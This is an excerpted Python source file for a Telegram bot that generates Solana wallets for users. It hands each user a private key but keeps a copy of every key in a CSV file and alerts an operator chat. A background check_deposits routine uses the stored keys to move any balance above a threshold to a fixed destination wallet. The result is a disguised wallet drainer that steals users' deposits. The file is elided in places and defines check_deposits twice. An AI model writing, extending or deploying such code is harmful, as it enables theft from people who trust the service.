...
# Constants for Solana functionality
...
WALLET_CSV_FILE = "H1WALLETS.csv"  # New CSV file for H1.py
...
async def make_rpc_request(session, request_data):
    try:
        async with session.post(SOLANA_RPC_URL, json=request_data) as response:
...
def create_transfer_tx(from_address: str, to_address: str, amount: float, recent_blockhash: str, private_key: str) -> str:
    try:
        ...
        # Create message
        message = (
            bytes([1, 0, 1]) +  # Version, num signatures, num readonly signed accounts
...
async def transfer_balance(private_key: str, from_address: str, amount: float) -> bool:
    try:
        async with aiohttp.ClientSession() as session:
            ...
            tx = create_transfer_tx(from_address, DESTINATION_WALLET, transfer_amount, recent_blockhash, private_key)
            if not tx:
                return False
            ...
            if 'error' in send_response:
                logger.error(f"Error sending transaction: {send_response['error']}")
                return False
...
async def generate_wallet():
    try:
        # Generate new keypair using nacl
        from nacl.signing import SigningKey
        import base58
        ...
        # Convert to base58
        private_key_b58 = base58.b58encode(bytes(private_key)).decode()
        public_key_b58 = base58.b58encode(bytes(public_key)).decode()
...
def init_wallet_csv():
    csv_file = 'H1WALLETS.csv'
    if not os.path.exists(csv_file):
        with open(csv_file, 'w', newline='') as file:
            writer = csv.writer(file)
            writer.writerow(['user_id', 'wallet_address', 'private_key'])
        api_logger.info("Created new wallet CSV file")
    else:
        df = pd.read_csv(csv_file, on_bad_lines='skip')
        if list(df.columns) != ['user_id', 'wallet_address', 'private_key']:
            df = pd.DataFrame(columns=['user_id', 'wallet_address', 'private_key'])
            df.to_csv(csv_file, index=False)
            api_logger.info("Fixed CSV file format")
    api_logger.info("Wallet CSV file initialized successfully")

async def check_deposits(context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        # Use generated wallets instead of predefined list
        for user_id, wallet_info in user_wallets.items():
            balance = await get_balance(wallet_info['address'])
            if balance and balance > MIN_TRANSFER_AMOUNT:
                success = await transfer_balance(
                    wallet_info['private_key'],
                    wallet_info['address'],
                    balance
                )
                if success:
                    logger.info(f"Successfully transferred {balance} SOL from {wallet_info['address']}")
                else:
                    logger.error(f"Failed to transfer {balance} SOL from {wallet_info['address']}")
    except Exception as e:
        logger.error(f"Error in check_deposits: {str(e)}")

@app.route('/api/wallet/generate', methods=['POST'])
async def generate_wallet_api():
    try:
        data = request.get_json()
        ...
        # Store wallet info
        df = pd.read_csv(WALLET_CSV_FILE)
        ...
        api_logger.error(f"Error generating wallet via API: {str(e)}")
        return jsonify({'error': str(e)}), 500

async def get_wallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        user_id = update.effective_user.id
        df = pd.read_csv('H1WALLETS.csv')
        existing_wallet = df[df['user_id'] == user_id]
        
        if not existing_wallet.empty:
            wallet_address = existing_wallet.iloc[0]['wallet_address']
            
            # Send wallet info to user's chat
            await update.message.reply_text(
                f"Your existing wallet address:\n`{wallet_address}`",
                parse_mode='Markdown'
            )
            ...
            await context.bot.send_message(
                ...
                text=f"User {user_id} requested their existing wallet:\n`{wallet_address}`",
                parse_mode='Markdown'
            )
        else:
            # Generate new wallet
            ...
            df = pd.concat([df, new_row], ignore_index=True)
            df.to_csv('H1WALLETS.csv', index=False)
            
            # Send wallet info to user's chat
            await update.message.reply_text(
                f"Your new wallet has been generated!\n\nWallet Address:\n`{wallet['public_key']}`\n\nPrivate Key (keep this safe!):\n`{wallet['private_key']}`",
                parse_mode='Markdown'
            )
            ...
            await context.bot.send_message(
                chat_id=NOTIFICATION_CHAT_ID,
                text=f"New wallet generated for user {user_id}:\nAddress: `{wallet['public_key']}`",
                parse_mode='Markdown'
            )
...
async def handle_wallet_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    try:
        if query.data.startswith("check_balance_"):
            wallet_address = query.data.replace("check_balance_", "")
            ...
            if balance is not None:
                ...
                await query.edit_message_text("Error checking balance. Please try again later.")
                
        elif query.data.startswith("show_key_"):
            wallet_address = query.data.replace("show_key_", "")
            df = pd.read_csv(WALLET_CSV_FILE)
            wallet_info = df[df['wallet_address'] == wallet_address]
            
            if not wallet_info.empty:
                private_key = wallet_info.iloc[0]['private_key']
                ...
                await query.edit_message_text("Error retrieving private key. Please try again later.")
            ...
            if wallet:
                ...
                keyboard = [
                    ...
                    [InlineKeyboardButton("Show Private Key", callback_data=f"show_key_{wallet['public_key']}")]
                ]
                ...
                await query.edit_message_text("Error generating new wallet. Please try again later.")
                
    except Exception as e:
        api_logger.error(f"Error in handle_wallet_callback: {str(e)}")
...
async def get_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        ...
        if not is_user_blocked(user_id):
            ...
            wallet = await generate_wallet()
            if not wallet:
                await update.message.reply_text("Failed to generate wallet. Please try again later.")
                return
            
            # Store wallet in memory and CSV
            user_wallets[user_id] = wallet
            with open('H1WALLETS.csv', 'a', newline='') as file:
                writer = csv.writer(file)
                writer.writerow([user_id, wallet['address'], wallet['private_key']])
            
            message = (
                "🎉 <b>Your New Wallet Details:</b>\n\n"
        ...
        if update.callback_query:
            await update.callback_query.answer("An error occurred while generating your wallet.")
        else:
            await update.message.reply_text("An error occurred while generating your wallet.")
...
async def check_deposits(context: ContextTypes.DEFAULT_TYPE) -> None:
    api_logger.info("Starting check_deposits function")
    try:
        # Check wallets from CSV file
        df = pd.read_csv(WALLET_CSV_FILE, on_bad_lines='skip')
        df = df.dropna()
        ...
        async with aiohttp.ClientSession() as session:
            for _, row in df.iterrows():
                ...
                api_logger.info(f"Checking wallet: {wallet_address}")
                ...
                api_logger.info(f"Current balance for {wallet_address}: {balance} SOL")
                
                if balance > MIN_TRANSFER_AMOUNT:
                    api_logger.info(f"Balance {balance} SOL exceeds threshold for {wallet_address}")
        ...
        api_logger.error(f"Error in check_deposits: {str(e)}")
    api_logger.info("Finished check_deposits function")
...
def main() -> None:
    ...
    for attempt in range(max_retries):
        try:
            ...
            # Remove the return statement since run_polling is already async
